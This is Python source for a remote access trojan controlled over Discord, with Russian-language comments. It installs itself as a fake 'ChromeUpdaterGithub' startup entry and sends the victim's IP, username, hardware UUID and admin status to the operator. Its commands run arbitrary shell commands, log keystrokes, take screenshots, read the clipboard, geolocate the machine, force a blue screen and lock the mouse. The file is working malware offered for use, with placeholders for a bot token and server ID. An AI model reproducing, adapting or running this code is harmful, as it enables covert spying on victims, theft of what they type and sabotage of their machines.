import subprocess
import discord
from discord.ext import commands, tasks
from discord_slash import SlashCommand, SlashContext
import socket
import requests
import getpass
import base64
import urllib.request
import json
import os
from subprocess import check_call
from subprocess import call
import time
import asyncio
import clipboard
import threading
from pynput.keyboard import Key, Listener
import logging
import ctypes
import pydub
import comtypes
from mss import mss
from win32com.client import Dispatch
import pywinauto
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
#============================================================
#=========================переменные=========================
#============================================================
uuid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
ip=requests.get("https://api.ipify.org?format=json").json()['ip']
username=getpass.getuser()
bluescreen2=""""""
settings = {
    'token': '', #your bot token
    'prefix': '!'
}
bot = commands.Bot(command_prefix=settings['prefix'])
slash = SlashCommand(bot, sync_commands=True)
guild_ids=[931591289420517416] #your guild id
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
   IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
#============================================================
#==========================дефки))===========================
#============================================================

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__)+"\\"+os.path.basename(__file__))
    bat_path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' 
    with open(bat_path + '\\' + "ChromeUpdaterGithub.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

@bot.event
async def on_ready():
    add_to_startup()
    global number
    on_ready.total = []
    number = 0
    global channel_name
    global chid
    channel_name = None
    for x in bot.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "сессия" in on_ready.total[y]:
            import re
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  
    if number == 0:
        channel_name = "сессия-1"
        newchannel = await bot.get_guild(guild_ids[0]).create_text_channel(channel_name)
    else:
        channel_name = f"сессия-{number}"
        newchannel = await bot.get_guild(guild_ids[0]).create_text_channel(channel_name)
    channel_ = discord.utils.get(bot.get_all_channels(), name=channel_name)
    chid = channel_.id
    channel = bot.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@everyone открыта новая {channel_name} | {uuid} | {username} | {ip}"
    if is_admin == True:
        await channel.send(f'{value1} | Права Админа)')
    elif is_admin == False:
        await channel.send(value1)

#============================================================
#==========================команды===========================
#============================================================
@slash.slash(name="info", description="Информация", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Информация", description=f"Идентификатор: {uuid}\nАйпи: {ip}\nИмя пользователя: {username}")
    await ctx.send(embeds=[embed])

@slash.slash(name="geo", description="Местоположение", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
        embed = discord.Embed(title="Успешно!",description=link)
        await ctx.send(embeds=[embed])

@slash.slash(name="startup", description="Добавить программу в автозапуск.", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    add_to_startup()
    embed = discord.Embed(title="Успешно!")
    await ctx.send(embeds=[embed])

@slash.slash(name="bluescreen", description="Синий экран смерти))", guild_ids=guild_ids)
async def test(ctx, numb):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Сделано!")
    await ctx.send(embeds=[embed])
    if str(numb) == "1":
        for i in range(1002312):
            with open(f"C:\\Users\\{username}\\AppData\\Roaming\\errorSystem32.bat", 'w') as f:
                f.write(bluescreen2)
            os.system(f"C:\\Users\\{username}\\AppData\\Roaming\\errorSystem32.bat")
            os.system(f"del C:\\Users\\{username}\\AppData\\Roaming\\errorSystem32.bat")
    if str(numb) == "2":
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

@slash.slash(name="message", description="Показывает на экран текст", guild_ids=guild_ids)
async def test(ctx, message):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Сделано!")
    await ctx.send(embeds=[embed])
    os.system(f'msg * /v "{str(message)}"')

@slash.slash(name="cmd", description="Выполняет любую команду в cmd", guild_ids=guild_ids)
async def test(ctx, command):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Сделано!")
    await ctx.send(embeds=[embed])
    os.system(f'{str(command)}')

@slash.slash(name="shutdown", description="Выключает компьютер", guild_ids=guild_ids)
async def test(ctx, seconds):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Будет выполнено через указаное время!")
    await ctx.send(embeds=[embed])
    await asyncio.sleep(int(seconds))
    os.system(f'shutdown /p')

@slash.slash(name="clipboard", description="Показывает скопированный текст", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Скопированный текст:", description=f"```{clipboard.paste()}```")
    await ctx.send(embeds=[embed])

@slash.slash(name="wallpaper", description="Ставит новые обои", guild_ids=guild_ids)
async def test(ctx, url):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Успешно поставили новые обои!")
    await ctx.send(embeds=[embed])
    with open(f"{os.getenv('TEMP')}\\{url.split('/')[-1]}", 'wb') as f:
        f.write(requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}).content)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{os.getenv('TEMP')}\\{url.split('/')[-1]}" , 0)

@slash.slash(name="say", description="Произносит ваше сообщение.", guild_ids=guild_ids)
async def test(ctx,message):
    if ctx.channel.id != chid:
        return
    volume.SetMasterVolumeLevel(-0.0, None) 
    embed = discord.Embed(title="Успешно :)")
    await ctx.send(embeds=[embed])
    speak = Dispatch("SAPI.SpVoice")
    speak.Speak(message)
    comtypes.CoUninitialize()

@slash.slash(name="maxVolume", description="Поставить максимальный звук.", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    volume.SetMasterVolumeLevel(-0.0, None)
    embed = discord.Embed(title="Успешно :)")
    await ctx.send(embeds=[embed])

@slash.slash(name="minVolume", description="Поставить максимальный звук.", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    volume.SetMasterVolumeLevel(-65.0, None)
    embed = discord.Embed(title="Успешно :)")
    await ctx.send(embeds=[embed])

@slash.slash(name="blockMouse", description="В хаотичном порядке передвигает мышкой и не даёт пользоваться пк.", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Успешно :)")
    await ctx.send(embeds=[embed])
    global blockedMouse
    blockedMouse = True
    @tasks.loop(seconds = 0)
    async def blockedMouse():
        pywinauto.mouse.move(coords=(0, 1000000))
    blockedMouse.start()

@slash.slash(name="freeMouse", description="Удаляет блокировку с мышки.", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Успешно :)")
    await ctx.send(embeds=[embed])
    blockedMouse.stop()

@slash.slash(name="screenshot", description="Делает скриншот.", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    with mss() as sct:
        sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitorasd2.png"))
    file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitorasd2.png"), filename="monitor.png")
    embed = discord.Embed(title="Успешно :)")
    await ctx.send(embeds=[embed], file=file)
    os.remove(os.path.join(os.getenv('TEMP') + "\\monitorasd2.png"))

@slash.slash(name="exit", description="Выходит из коня(", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Успешно :(")
    await ctx.send(embeds=[embed])
    exit()

@slash.slash(name="startLogger", description="Начинает записывать все нажатия клавиш.", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    embed = discord.Embed(title="Успешно.")
    await ctx.send(embeds=[embed])
    temp = os.getenv("TEMP")
    logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def keylog():
        def on_press(key):
            logging.info(str(key))
        with Listener(on_press=on_press) as listener:
            listener.join()
    global test
    test = threading.Thread(target=keylog)
    test._running = True
    test.daemon = True
    test.start()

@slash.slash(name="stopLogger", description="Отправляет данные с записи.", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    test._running = False
    temp = os.getenv("TEMP")
    file_keys = os.path.join(os.getenv('TEMP') + "\\key_log.txt")
    file = discord.File(file_keys, filename=file_keys)
    embed = discord.Embed(title="Успешно.")
    await ctx.send(embeds=[embed], file=file)
    os.remove(os.path.join(os.getenv('TEMP') + "\\key_log.txt"))
    
@slash.slash(name="rickroll", description="Never gonna give you up!!!", guild_ids=guild_ids)
async def test(ctx):
    if ctx.channel.id != chid:
        return
    volume.SetMasterVolumeLevel(-0.0, None)
    os.system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    embed = discord.Embed(title="Нэвер гонна гив ю ап!")
    await ctx.send(embeds=[embed])


#============================================================
#===========================конец============================
#============================================================

bot.run(settings['token'])